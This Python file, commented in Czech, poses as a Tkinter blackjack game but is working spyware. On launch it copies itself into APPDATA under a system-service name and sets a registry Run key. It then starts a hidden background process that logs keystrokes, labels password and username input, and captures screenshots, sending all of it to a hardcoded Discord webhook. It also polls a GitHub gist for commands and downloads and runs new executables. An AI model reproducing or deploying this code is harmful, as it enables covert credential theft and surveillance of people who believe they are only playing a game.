import io
import json
import os
import platform
import random
import shutil
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone
from pathlib import Path

import requests
from pynput import keyboard

# ═══════════════════════════════════════════════════════════════
# KONFIGURACE
# ═══════════════════════════════════════════════════════════════

IS_WINDOWS = platform.system().lower() == "windows"
IS_MACOS = platform.system().lower() == "darwin"

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553128485424201800/7K1yoUlOaf_GLSwJHmu8pJ_Jp0He-bg2VOldAjYs4dk8rIN3NrUMRFHfoUcJSSnPLuAb"

GIST_COMMAND_URL = "https://gist.githubusercontent.com/Mickjay07/f9a42765192efe58e0bbdff8ac76b959/raw/gistfile1.txt"

POLL_INTERVAL = 30

FLUSH_INTERVAL = 5
FLUSH_ON_CHARS = 20
FLUSH_ON_ENTER = True
CAPTURE_WINDOW_TITLE = True
CAPTURE_FIELD_TYPE = True
MAX_RETRIES = 3
RETRY_DELAY = 5

APP_VERSION = 1  # interní verze pro update check

# Persistence
APP_DIR = Path(os.environ.get("APPDATA", Path.home() / ".local/share")) / "SystemService"
APP_NAME = "SystemService.exe"
REGISTRY_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
REGISTRY_VALUE = "SystemServiceUpdate"


# ═══════════════════════════════════════════════════════════════
# DIAGNOSTIKA
# ═══════════════════════════════════════════════════════════════

def _get_hostname():
    import socket
    try:
        return socket.gethostname()
    except Exception:
        return "unknown"


def _get_username():
    try:
        return os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
    except Exception:
        return "unknown"


def send_startup_signal():
    try:
        mode = "SILENT" if "--silent" in sys.argv else "INTERACTIVE"
        requests.post(DISCORD_WEBHOOK_URL, json={
            "embeds": [{
                "title": "🟢 Logger spuštěn",
                "description": f"Host: `{_get_hostname()}`\nUser: `{_get_username()}`\nMode: `{mode}`\nOS: `{platform.system()} {platform.release()}`\nPID: `{os.getpid()}`\nVersion: `{APP_VERSION}`",
                "color": 0x00FF00,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }]
        }, timeout=15)
    except Exception as e:
        try:
            log_file = APP_DIR / "startup_error.log"
            APP_DIR.mkdir(parents=True, exist_ok=True)
            with open(log_file, "a") as f:
                f.write(f"{datetime.now().isoformat()} — STARTUP FAIL: {e}\n")
        except Exception:
            pass


def send_error_signal(context: str, error: Exception):
    try:
        import traceback
        tb = traceback.format_exc()
        requests.post(DISCORD_WEBHOOK_URL, json={
            "embeds": [{
                "title": f"🔴 Error: {context}",
                "description": f"Host: `{_get_hostname()}`\nError: `{type(error).__name__}: {str(error)[:500]}`\n```{tb[:1500]}```",
                "color": 0xFF0000,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }]
        }, timeout=15)
    except Exception:
        pass


def send_gist_status():
    try:
        cache_bust_url = f"{GIST_COMMAND_URL}?_t={int(time.time())}"
        resp = requests.get(cache_bust_url, timeout=10, headers={
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        })
        status = f"HTTP {resp.status_code}"
        content = resp.text.strip()[:100] if resp.status_code == 200 else "N/A"
        requests.post(DISCORD_WEBHOOK_URL, json={
            "embeds": [{
                "title": "📡 Gist C2 Status",
                "description": f"URL: `{GIST_COMMAND_URL[:80]}...`\nStatus: `{status}`\nContent: `{content}`",
                "color": 0x0099FF,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }]
        }, timeout=15)
    except Exception as e:
        send_error_signal("Gist C2 check", e)


def start_heartbeat():
    def _beat():
        while True:
            time.sleep(300)
            try:
                requests.post(DISCORD_WEBHOOK_URL, json={
                    "embeds": [{
                        "title": "💓 Heartbeat",
                        "description": f"Host: `{_get_hostname()}`\nLogger alive\nPID: `{os.getpid()}`",
                        "color": 0xAAAAAA,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                    }]
                }, timeout=15)
            except Exception:
                pass

    t = threading.Thread(target=_beat, daemon=True)
    t.start()


# ═══════════════════════════════════════════════════════════════
# PERSISTENCE
# ═══════════════════════════════════════════════════════════════

def is_already_running():
    """Zjistí, jestli už silent instance běží (proti dvojímu spawnu)."""
    try:
        if IS_WINDOWS:
            import psutil
            current_pid = os.getpid()
            for proc in psutil.process_iter(["pid", "name"]):
                try:
                    if proc.info["pid"] != current_pid and \
                       proc.info["name"] and "SystemService" in proc.info["name"].lower():
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        return False
    except Exception:
        return False


def install():
    if not IS_WINDOWS:
        return
    try:
        APP_DIR.mkdir(parents=True, exist_ok=True)
        src = Path(sys.argv[0])
        dst = APP_DIR / APP_NAME
        if src != dst and src.exists():
            shutil.copy2(src, dst)

        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, REGISTRY_KEY, 0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(
            key, REGISTRY_VALUE, 0, winreg.REG_SZ, f'"{dst}" --silent'
        )
        winreg.CloseKey(key)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
# SCREENSHOT
# ═══════════════════════════════════════════════════════════════

def take_screenshot() -> bytes | None:
    try:
        if IS_WINDOWS:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            return buf.getvalue()
        elif IS_MACOS:
            result = subprocess.run(
                ["screencapture", "-x", "-m", "/tmp/_ss.png"],
                capture_output=True, timeout=10
            )
            if result.returncode == 0:
                with open("/tmp/_ss.png", "rb") as f:
                    data = f.read()
                os.remove("/tmp/_ss.png")
                return data
    except Exception as e:
        send_error_signal("take_screenshot", e)
    return None


def send_screenshot_to_discord():
    try:
        ss = take_screenshot()
        if not ss:
            send_error_signal("Screenshot", Exception("take_screenshot() vrátil None"))
            return

        hostname = _get_hostname()

        if len(ss) > 7 * 1024 * 1024:
            from PIL import Image
            img = Image.open(io.BytesIO(ss))
            img = img.resize((img.width // 2, img.height // 2), Image.LANCZOS)
            buf = io.BytesIO()
            img.save(buf, format="PNG", optimize=True)
            ss = buf.getvalue()

        resp = requests.post(
            DISCORD_WEBHOOK_URL,
            data={"payload_json": json.dumps({
                "content": f"📸 Screenshot from `{hostname}` @ {datetime.now().strftime('%H:%M:%S')}",
            })},
            files={"files": ("screenshot.png", ss, "image/png")},
            timeout=30
        )
        if resp.status_code not in [200, 204]:
            send_error_signal("Screenshot upload", Exception(f"Discord API HTTP {resp.status_code}: {resp.text[:200]}"))
    except Exception as e:
        send_error_signal("Screenshot celý", e)


# ═══════════════════════════════════════════════════════════════
# AUTO-UPDATE — stáhne nové exe a spustí ho
# ═══════════════════════════════════════════════════════════════

def download_and_run_update(url: str):
    """Stáhne nové exe z URL a spustí ho."""
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={
            "embeds": [{
                "title": "🔄 Update stahován",
                "description": f"Host: `{_get_hostname()}`\nURL: `{url[:200]}`\nStahuji a spouštím...",
                "color": 0xFFAA00,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }]
        }, timeout=15)

        resp = requests.get(url, timeout=120, stream=True)
        if resp.status_code != 200:
            send_error_signal("Update download", Exception(f"HTTP {resp.status_code}"))
            return False

        tmp_path = APP_DIR / "update_new.exe"
        APP_DIR.mkdir(parents=True, exist_ok=True)

        with open(tmp_path, "wb") as f:
            for chunk in resp.iter_content(chunk_size=8192):
                f.write(chunk)

        # Nahraď starý exe novým
        old_path = APP_DIR / APP_NAME
        if old_path.exists():
            old_path.unlink()
        tmp_path.rename(old_path)

        # Spusť novou verzi
        if IS_WINDOWS:
            creation_flags = 0x00000200 | 0x08000000
            subprocess.Popen(
                [str(old_path), "--silent"],
                creationflags=creation_flags,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
            )

        requests.post(DISCORD_WEBHOOK_URL, json={
            "embeds": [{
                "title": "✅ Update dokončen",
                "description": f"Host: `{_get_hostname()}`\nNová verze spuštěna.",
                "color": 0x00FF00,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }]
        }, timeout=15)

        return True
    except Exception as e:
        send_error_signal("Update", e)
        return False


# ═══════════════════════════════════════════════════════════════
# COMMAND POLLING
# ═══════════════════════════════════════════════════════════════

def poll_commands():
    """Stahuje gist každých POLL_INTERVAL sekund a provádí commandy.

    Podporované commandy (multi-line gist):
    SCREENSHOT           → screenshot na Discord
    NONE                 → nic
    VERSION:N            → pokud N > APP_VERSION, stáhne update
    UPDATE:https://...   → URL pro update (používá se s VERSION)
    """
    last_command = None
    poll_count = 0
    update_url = None

    while True:
        try:
            cache_bust_url = f"{GIST_COMMAND_URL}?_t={int(time.time())}"
            resp = requests.get(cache_bust_url, timeout=10, headers={
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
            })
            if resp.status_code == 200:
                raw = resp.text.strip()
                lines = [l.strip() for l in raw.split("\n") if l.strip()]

                # Parsuj commandy
                cmd = "NONE"
                new_version = None
                new_url = None

                for line in lines:
                    line_upper = line.upper()
                    if line_upper == "SCREENSHOT":
                        cmd = "SCREENSHOT"
                    elif line_upper == "NONE":
                        cmd = "NONE"
                    elif line_upper.startswith("VERSION:"):
                        try:
                            new_version = int(line.split(":", 1)[1].strip())
                        except ValueError:
                            pass
                    elif line.upper().startswith("UPDATE:"):
                        new_url = line.split(":", 1)[1].strip()

                # Update check
                if new_version is not None and new_version > APP_VERSION and new_url:
                    if last_command != f"UPDATE:{new_version}":
                        download_and_run_update(new_url)
                        last_command = f"UPDATE:{new_version}"
                elif cmd != last_command:
                    if cmd == "SCREENSHOT":
                        send_screenshot_to_discord()
                        last_command = cmd
                    elif cmd == "NONE":
                        last_command = cmd

        except Exception:
            pass

        poll_count += 1

        if poll_count % 10 == 0:
            try:
                content_preview = "N/A"
                try:
                    content_preview = resp.text.strip()[:50] if resp else "no response"
                except Exception:
                    pass
                requests.post(DISCORD_WEBHOOK_URL, json={
                    "embeds": [{
                        "title": "🔄 Poller Status",
                        "description": f"Poll count: `{poll_count}`\nLast command: `{last_command}`\nGist: `{content_preview}`",
                        "color": 0x00AA00,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                    }]
                }, timeout=15)
            except Exception:
                pass

        time.sleep(POLL_INTERVAL)


def start_command_poller():
    t = threading.Thread(target=poll_commands, daemon=True)
    t.start()


# ═══════════════════════════════════════════════════════════════
# AKTIVNI OKNO + PROCESS NAME + TYP POLE
# ═══════════════════════════════════════════════════════════════

def get_active_window_title():
    if not CAPTURE_WINDOW_TITLE:
        return None
    try:
        if IS_WINDOWS:
            import win32gui
            hwnd = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(hwnd)
        elif IS_MACOS:
            script = 'tell application "System Events" to get name of front window of (first application process whose frontmost is true)'
            result = subprocess.run(
                ["osascript", "-e", script],
                capture_output=True, text=True, timeout=2
            )
            title = result.stdout.strip()
            return title if title else None
        else:
            return None
    except Exception:
        return None


def get_active_process_name():
    try:
        if IS_WINDOWS:
            import win32gui
            import win32process
            import psutil
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            return psutil.Process(pid).name()
        elif IS_MACOS:
            script = 'tell application "System Events" to get name of first application process whose frontmost is true'
            result = subprocess.run(
                ["osascript", "-e", script],
                capture_output=True, text=True, timeout=2
            )
            name = result.stdout.strip()
            return name if name else None
        else:
            return None
    except Exception:
        return None


def get_field_context():
    if not CAPTURE_FIELD_TYPE:
        return (False, False, None)

    if IS_MACOS:
        title = (get_active_window_title() or "").lower()
        if any(w in title for w in ["heslo", "password", "přihlášení", "prihlaseni", "login", "sign in", "zadejte"]):
            return (False, True, title)
        return (False, False, None)

    if not IS_WINDOWS:
        return (False, False, None)
    try:
        import uiautomation as auto
        control = auto.GetFocusedControl()
        if control is None:
            return (False, False, None)

        is_password = bool(getattr(control, "IsPassword", False))
        name = (control.Name or "").lower()
        auto_id = (control.AutomationId or "").lower()

        USERNAME_HINTS = [
            "username", "user name", "user", "login", "log in", "logon",
            "email", "e-mail", "mail", "jmeno", "uživatel", "uzivatel",
            "prihlasovaci", "přihlašovací", "account", "ucet", "účet",
        ]
        is_username = any(h in name or h in auto_id for h in USERNAME_HINTS)

        field_hint = name or auto_id or None
        return (is_password, is_username, field_hint)
    except Exception:
        return (False, False, None)


def get_full_context():
    return (
        get_active_process_name(),
        get_active_window_title(),
        *get_field_context(),
    )


# ═══════════════════════════════════════════════════════════════
# DORUCENI — Discord webhook
# ═══════════════════════════════════════════════════════════════

class WebhookDelivery:
    def __init__(self):
        self.buffer = []
        self.lock = threading.Lock()

    def add(self, text: str, ctx: tuple):
        app, title, is_pw, is_user, hint = ctx
        with self.lock:
            self.buffer.append({
                "char": text,
                "app": app or "unknown",
                "title": title or "",
                "pw": is_pw,
                "user": is_user,
                "hint": hint or "",
            })

    def _hostname(self):
        import socket
        try:
            return socket.gethostname()
        except Exception:
            return "unknown"

    def _group_entries(self, entries):
        grouped = {}
        for e in entries:
            app = e["app"]
            if app not in grouped:
                grouped[app] = {"normal": "", "password": "", "username": "", "title": e["title"]}
            if e["pw"]:
                grouped[app]["password"] += e["char"]
            elif e["user"]:
                grouped[app]["username"] += e["char"]
            else:
                grouped[app]["normal"] += e["char"]
        return grouped

    def _format_discord_payload(self, grouped):
        ts = datetime.now(timezone.utc).isoformat()
        fields = []
        for app, data in grouped.items():
            body = ""
            if data["username"]:
                body += f"**[USERNAME]** `{data['username']}`\n"
            if data["password"]:
                body += f"**[PASSWORD]** `{data['password']}`\n"
            if data["normal"]:
                body += f"{data['normal']}"
            if body:
                fields.append({
                    "name": f"🖥️ {app}",
                    "value": body[:1000],
                    "inline": False,
                })
        return {
            "embeds": [{
                "title": "Keystroke Log",
                "description": f"Host: `{self._hostname()}`",
                "color": 0xFF0000,
                "timestamp": ts,
                "fields": fields[:25],
            }]
        }

    def _deliver(self, grouped):
        for attempt in range(MAX_RETRIES):
            try:
                payload = self._format_discord_payload(grouped)
                resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
                resp.raise_for_status()
                return True
            except Exception:
                if attempt < MAX_RETRIES - 1:
                    time.sleep(RETRY_DELAY)
        return False

    def flush(self):
        with self.lock:
            if not self.buffer:
                return
            entries = list(self.buffer)
            self.buffer.clear()
        grouped = self._group_entries(entries)
        if self._deliver(grouped):
            pass
        else:
            with self.lock:
                for e in reversed(entries):
                    self.buffer.insert(0, e)

    def scheduler(self):
        while True:
            time.sleep(FLUSH_INTERVAL)
            self.flush()


# ═══════════════════════════════════════════════════════════════
# KEYLOGGER
# ═══════════════════════════════════════════════════════════════

SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "[ENTER]\n",
    keyboard.Key.tab: "[TAB]",
    keyboard.Key.backspace: "[BKSP]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.shift: "",
    keyboard.Key.shift_r: "",
    keyboard.Key.ctrl_l: "[CTRL]",
    keyboard.Key.ctrl_r: "[CTRL]",
    keyboard.Key.alt_l: "[ALT]",
    keyboard.Key.alt_r: "[ALT]",
    keyboard.Key.caps_lock: "[CAPS]",
    keyboard.Key.cmd: "[WIN]",
    keyboard.Key.delete: "[DEL]",
}


class Keylogger:
    def __init__(self):
        self.delivery = WebhookDelivery()

    def _format_key(self, key):
        if key in SPECIAL_KEYS:
            return SPECIAL_KEYS[key]
        try:
            return key.char if key.char else ""
        except AttributeError:
            pass
        try:
            return f"[{key.name.upper()}]"
        except AttributeError:
            return ""

    def _on_press(self, key):
        text = self._format_key(key)
        if not text:
            return
        ctx = get_full_context()
        self.delivery.add(text, ctx)

        if (FLUSH_ON_ENTER and key == keyboard.Key.enter) or \
           len(self.delivery.buffer) >= FLUSH_ON_CHARS:
            self.delivery.flush()

    def run_background(self):
        t_scheduler = threading.Thread(target=self.delivery.scheduler, daemon=True)
        t_scheduler.start()
        t_listener = threading.Thread(target=self._start_listener, daemon=True)
        t_listener.start()

    def _start_listener(self):
        with keyboard.Listener(on_press=self._on_press) as listener:
            listener.join()


# ═══════════════════════════════════════════════════════════════
# GUI BLACKJACK — Tkinter
# ═══════════════════════════════════════════════════════════════

SUIT_SYMBOLS = {"♠": "♠", "♥": "♥", "♦": "♦", "♣": "♣"}
SUIT_COLORS = {"♠": "#FFFFFF", "♥": "#FF6B6B", "♦": "#FF6B6B", "♣": "#FFFFFF"}
RANKS = ["A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K"]


def card_value(card):
    rank = card[0]
    if rank in ["J", "Q", "K"]:
        return 10
    elif rank == "A":
        return 11
    return int(rank)


def hand_value(hand):
    total = sum(card_value(c) for c in hand)
    aces = sum(1 for c in hand if c[0] == "A")
    while total > 21 and aces > 0:
        total -= 10
        aces -= 1
    return total


class BlackjackGUI:
    def __init__(self):
        import tkinter as tk
        from tkinter import font as tkfont

        self.tk = tk
        self.root = tk.Tk()
        self.root.title("♠♥ Blackjack ♦♣")
        self.root.geometry("800x600")
        self.root.configure(bg="#0D3320")
        self.root.resizable(False, False)

        # Fonty
        self.title_font = tkfont.Font(family="Arial", size=24, weight="bold")
        self.card_font = tkfont.Font(family="Arial", size=18, weight="bold")
        self.card_small_font = tkfont.Font(family="Arial", size=14)
        self.info_font = tkfont.Font(family="Arial", size=16, weight="bold")
        self.btn_font = tkfont.Font(family="Arial", size=14, weight="bold")

        # Stav hry
        self.chips = 100
        self.bet = 0
        self.deck = []
        self.player_hand = []
        self.dealer_hand = []
        self.game_over = False

        self._build_ui()
        self._show_bet_screen()

    def _build_ui(self):
        tk = self.tk

        # Header
        self.header = tk.Label(
            self.root, text="♠♥ BLACKJACK ♦♣",
            font=self.title_font, bg="#0D3320", fg="#FFD700"
        )
        self.header.pack(pady=(10, 5))

        self.chips_label = tk.Label(
            self.root, text=f"Žetony: {self.chips}",
            font=self.info_font, bg="#0D3320", fg="#FFFFFF"
        )
        self.chips_label.pack()

        # Hlavní frame pro karty
        self.cards_frame = tk.Frame(self.root, bg="#0D3320")
        self.cards_frame.pack(expand=True, fill="both", padx=20, pady=10)

        # Dealer
        self.dealer_label = tk.Label(
            self.cards_frame, text="DEALER",
            font=self.info_font, bg="#0D3320", fg="#AAAAAA"
        )
        self.dealer_label.pack(pady=(5, 2))

        self.dealer_cards = tk.Label(
            self.cards_frame, text="",
            font=self.card_font, bg="#1A4D2E", fg="#FFFFFF",
            width=40, height=3
        )
        self.dealer_cards.pack(pady=(2, 10), ipadx=10, ipady=5)

        # Player
        self.player_label = tk.Label(
            self.cards_frame, text="TY",
            font=self.info_font, bg="#0D3320", fg="#AAAAAA"
        )
        self.player_label.pack(pady=(5, 2))

        self.player_cards = tk.Label(
            self.cards_frame, text="",
            font=self.card_font, bg="#1A4D2E", fg="#FFFFFF",
            width=40, height=3
        )
        self.player_cards.pack(pady=(2, 10), ipadx=10, ipady=5)

        # Status zpráva
        self.status_label = tk.Label(
            self.root, text="",
            font=self.info_font, bg="#0D3320", fg="#FFD700"
        )
        self.status_label.pack(pady=5)

        # Button frame
        self.btn_frame = tk.Frame(self.root, bg="#0D3320")
        self.btn_frame.pack(pady=10)

        # Bet frame
        self.bet_frame = tk.Frame(self.root, bg="#0D3320")

        self.bet_label = tk.Label(
            self.bet_frame, text="Sázka:",
            font=self.info_font, bg="#0D3320", fg="#FFFFFF"
        )
        self.bet_label.pack(side="left", padx=(10, 5))

        self.bet_var = tk.StringVar(value="10")
        self.bet_entry = tk.Entry(
            self.bet_frame, textvariable=self.bet_var,
            font=self.card_small_font, width=8, justify="center"
        )
        self.bet_entry.pack(side="left", padx=5)

        self.deal_btn = tk.Button(
            self.bet_frame, text="🎨 Rozdat",
            font=self.btn_font, bg="#4CAF50", fg="white",
            activebackground="#45A049", cursor="hand2",
            command=self._start_round
        )
        self.deal_btn.pack(side="left", padx=10)

        # Action buttons
        self.hit_btn = tk.Button(
            self.btn_frame, text="📋 HIT",
            font=self.btn_font, bg="#2196F3", fg="white",
            activebackground="#1976D2", cursor="hand2",
            state="disabled", command=self._hit
        )
        self.hit_btn.pack(side="left", padx=10, ipadx=20, ipady=5)

        self.stand_btn = tk.Button(
            self.btn_frame, text="✋ STAND",
            font=self.btn_font, bg="#FF9800", fg="white",
            activebackground="#F57C00", cursor="hand2",
            state="disabled", command=self._stand
        )
        self.stand_btn.pack(side="left", padx=10, ipadx=20, ipady=5)

    def _show_bet_screen(self):
        self.bet_frame.pack(pady=10)
        self.btn_frame.pack_forget()
        self.status_label.config(text="Zadej sázku a klikni Rozdat")

    def _show_action_buttons(self):
        self.bet_frame.pack_forget()
        self.btn_frame.pack(pady=10)

    def _build_deck(self):
        self.deck = [(r, s) for s in ["♠", "♥", "♦", "♣"] for r in RANKS]
        random.shuffle(self.deck)

    def _deal_card(self):
        if not self.deck:
            self._build_deck()
        return self.deck.pop()

    def _update_display(self, reveal_dealer=False):
        # Dealer karty
        dealer_text = ""
        for i, (rank, suit) in enumerate(self.dealer_hand):
            if i == 0 and not reveal_dealer:
                dealer_text += "🂠  "
            else:
                color_tag = "red" if suit in ["♥", "♦"] else ""
                dealer_text += f"{rank}{suit}  "

        dealer_val = hand_value(self.dealer_hand[1:]) if not reveal_dealer else hand_value(self.dealer_hand)
        if not reveal_dealer:
            self.dealer_cards.config(text=dealer_text + f"  (?)")
        else:
            self.dealer_cards.config(text=dealer_text + f"  ({dealer_val})")

        # Player karty
        player_text = ""
        for rank, suit in self.player_hand:
            player_text += f"{rank}{suit}  "
        player_val = hand_value(self.player_hand)
        self.player_cards.config(text=player_text + f"  ({player_val})")

        self.chips_label.config(text=f"Žetony: {self.chips}")

    def _start_round(self):
        try:
            bet = int(self.bet_var.get())
        except ValueError:
            self.status_label.config(text="⚠ Neplatná sázka!")
            return

        if bet < 1 or bet > self.chips:
            self.status_label.config(text=f"⚠ Sázka musí být 1-{self.chips}!")
            return

        self.bet = bet
        self.game_over = False

        self._build_deck()
        self.player_hand = [self._deal_card(), self._deal_card()]
        self.dealer_hand = [self._deal_card(), self._deal_card()]

        self._update_display(reveal_dealer=False)
        self._show_action_buttons()
        self.hit_btn.config(state="normal")
        self.stand_btn.config(state="normal")

        # Blackjack check
        if hand_value(self.player_hand) == 21:
            self._end_round("🎉 BLACKJACK! Výhra 3:2!", self.bet + self.bet // 2)
            return

        self.status_label.config(text="Hit nebo Stand?")

    def _hit(self):
        if self.game_over:
            return
        self.player_hand.append(self._deal_card())
        self._update_display(reveal_dealer=False)

        val = hand_value(self.player_hand)
        if val > 21:
            self._end_round("💥 BUST! Přesáhl jsi 21.", -self.bet)
        elif val == 21:
            self._stand()

    def _stand(self):
        if self.game_over:
            return
        self.game_over = True
        self.hit_btn.config(state="disabled")
        self.stand_btn.config(state="disabled")

        # Dealer hraje
        self._update_display(reveal_dealer=True)

        def dealer_play():
            if hand_value(self.dealer_hand) < 17:
                self.dealer_hand.append(self._deal_card())
                self._update_display(reveal_dealer=True)
                self.root.after(800, dealer_play)
            else:
                self._resolve()

        self.root.after(800, dealer_play)

    def _resolve(self):
        dealer_val = hand_value(self.dealer_hand)
        player_val = hand_value(self.player_hand)

        if dealer_val > 21:
            self._end_round("🎉 Dealer BUST! Vyhrál jsi!", self.bet)
        elif dealer_val > player_val:
            self._end_round("😞 Dealer vyhrává.", -self.bet)
        elif dealer_val < player_val:
            self._end_round("🎉 Vyhrál jsi!", self.bet)
        else:
            self._end_round("🤝 Push (remíza).", 0)

    def _end_round(self, message, chip_change):
        self.game_over = True
        self.hit_btn.config(state="disabled")
        self.stand_btn.config(state="disabled")

        self.chips += chip_change
        self._update_display(reveal_dealer=True)
        self.status_label.config(text=message)

        if self.chips <= 0:
            self.status_label.config(text="💸 Bankrot! Klikni Rozdat pro novou hru (100 žetonů)")
            self.chips = 100
            self._update_display(reveal_dealer=True)
        else:
            self.root.after(2000, self._show_bet_screen)

    def run(self):
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
        self.root.mainloop()

    def _on_close(self):
        # Zavření okna → proces hra umře, ale silent subprocess žije dál
        self.root.destroy()


# ═══════════════════════════════════════════════════════════════
# SPAWNER
# ═══════════════════════════════════════════════════════════════

def spawn_silent_subprocess():
    try:
        # Kontrola: už běží silent instance? Nespawnuj další.
        if is_already_running():
            return True  # už běží, není potřeba

        if IS_WINDOWS:
            exe = sys.executable
            args = [exe, "--silent"]
            creation_flags = (
                0x00000200 |  # CREATE_NEW_PROCESS_GROUP
                0x08000000    # CREATE_NO_WINDOW
            )
            subprocess.Popen(
                args,
                creationflags=creation_flags,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
            )
        else:
            args = [sys.executable, __file__, "--silent"]
            subprocess.Popen(
                args,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True,
            )
        return True
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    silent = "--silent" in sys.argv

    if not silent:
        # ═══ INTERACTIVE MÓD ═══
        install()
        send_startup_signal()  # i interactive posílá signal
        spawned = spawn_silent_subprocess()
        if spawned:
            time.sleep(0.5)

        # Spusť GUI Blackjack
        try:
            game = BlackjackGUI()
            game.run()
        except Exception as e:
            # Fallback na terminál pokud GUI selže
            send_error_signal("GUI Blackjack", e)
            run_blackjack_console()

        # GUI zavřeno → exit (silent subprocess žije dál)
        sys.exit(0)

    else:
        # ═══ SILENT MÓD ═══
        # Nespawnuj další pokud už běží
        if is_already_running():
            sys.exit(0)

        send_startup_signal()
        send_gist_status()
        start_heartbeat()

        logger = Keylogger()
        logger.run_background()
        start_command_poller()

        while True:
            time.sleep(60)


def run_blackjack_console():
    """Fallback terminálový blackjack pokud GUI selže."""
    chips = 100
    print("=" * 40)
    print("       ♠♥ BLACKJACK ♦♣")
    print("=" * 40)
    print(f"\n  Vítej! Začínáš s {chips} žetony.\n")

    while chips > 0:
        print(f"─" * 40)
        print(f"  Žetony: {chips}")
        try:
            bet = input(f"  Sázka (1-{chips}, nebo 'q' pro konec): ").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if bet.lower() == "q":
            break

        try:
            bet = int(bet)
        except ValueError:
            print("  ⚠ Neplatná sázka!\n")
            continue

        if bet < 1 or bet > chips:
            print(f"  ⚠ Sázka musí být 1-{chips}!\n")
            continue

        deck = [(r, s) for s in ["♠", "♥", "♦", "♣"] for r in RANKS]
        random.shuffle(deck)

        def deal():
            return deck.pop() if deck else None

        player = [deal(), deal()]
        dealer = [deal(), deal()]

        print(f"\n  Dealer: 🂠 {dealer[1][0]}{dealer[1][1]}")
        print(f"  Ty: {' '.join(f'{r}{s}' for r, s in player)}  ({hand_value(player)})\n")

        if hand_value(player) == 21:
            print("  🎉 BLACKJACK! Výhra 3:2!")
            chips += bet + bet // 2
            print(f"  Žetony: {chips}\n")
            continue

        busted = False
        while True:
            action = input("  [H]it / [S]tand: ").strip().lower()
            if action == "h":
                player.append(deal())
                print(f"\n  Ty: {' '.join(f'{r}{s}' for r, s in player)}  ({hand_value(player)})\n")
                if hand_value(player) > 21:
                    print("  💥 BUST!")
                    chips -= bet
                    busted = True
                    break
                elif hand_value(player) == 21:
                    break
            elif action == "s":
                break

        if busted:
            print(f"  Žetony: {chips}\n")
            continue

        print("\n  Dealer hraje...")
        time.sleep(1)
        while hand_value(dealer) < 17:
            dealer.append(deal())
            print(f"  Dealer: {' '.join(f'{r}{s}' for r, s in dealer)}  ({hand_value(dealer)})")
            time.sleep(0.8)

        dv, pv = hand_value(dealer), hand_value(player)
        print()
        if dv > 21:
            print("  🎉 Dealer BUST! Vyhrál jsi!")
            chips += bet
        elif dv > pv:
            print("  😞 Dealer vyhrává.")
            chips -= bet
        elif dv < pv:
            print("  🎉 Vyhrál jsi!")
            chips += bet
        else:
            print("  🤝 Push.")

        print(f"  Žetony: {chips}\n")

    print("=" * 40)
    print("  Konec hry!")
    print("=" * 40)
